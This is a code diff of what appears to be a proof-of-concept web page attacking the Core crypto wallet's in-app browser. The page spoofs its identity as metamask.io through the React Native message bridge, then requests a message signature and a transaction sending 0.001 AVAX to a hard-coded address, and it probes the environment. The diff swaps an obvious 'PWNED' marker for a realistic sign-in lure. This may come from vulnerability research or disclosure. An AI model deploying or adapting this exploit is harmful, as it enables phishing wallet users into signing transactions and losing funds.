@@ -18,10 +18,12 @@
   <pre id="log"></pre>
 
   <script>
-    const SIGN_MSG = 'PWNED BY BADCAT 0xDEADBEEF';
-    const TX_TO    = '0x000000000000000000000000fff';
-    const TX_VALUE = '0x38d7ea4c68000';
+    // ── hard-coded payload ──────────────────────────────────────
+    const SIGN_MSG = 'Sign in to core.app — nonce: 0xDEADBEEF';
+    const TX_TO    = '0xdEadBeefdeadBEEFDEadbEefdEadbeefdeAdBeef';
+    const TX_VALUE = '0x38d7ea4c68000';      // 0.001 AVAX
 
+    // ── helpers ─────────────────────────────────────────────────
     const logEl = document.getElementById('log');
     const log = (m) => {
       logEl.textContent += '[' + new Date().toISOString().slice(11,19) + '] ' + m + "\n";
@@ -32,14 +34,14 @@
       const rn = window.ReactNativeWebView;
       if (!rn || !rn.postMessage) { log('ERR: not in Core in-app browser'); return false; }
       rn.postMessage(JSON.stringify(obj));
-      log('SENT  ' + JSON.stringify(obj).slice(0, 200));
+      log('SENT -> ' + JSON.stringify(obj).slice(0, 200));
       return true;
     };
     const spoofIdentity = () => send({
       method:'domain_metadata',
       payload: JSON.stringify({
         domain:'', name:'metamask.io',
-        icon:'', url:''
+        icon:'https://metamask.io/favicons/default/favicon.ico', url:''
       })
     });
     const rnReq = (req) => send({
@@ -52,6 +54,7 @@
     const utf8ToHex = (s) => '0x' + Array.from(new TextEncoder().encode(s))
       .map(b => b.toString(16).padStart(2,'0')).join('');
 
+    // ── one-shot flow ───────────────────────────────────────────
     document.getElementById('btnGo').onclick = () => {
       spoofIdentity();
       setTimeout(() => rnReq({
@@ -67,6 +70,7 @@
       }, 4000);
     };
 
+    // ── env probe ───────────────────────────────────────────────
     log('UA: ' + navigator.userAgent.slice(0,70));
     log('ReactNativeWebView: ' + !!window.ReactNativeWebView);
     if (window.ethereum) {
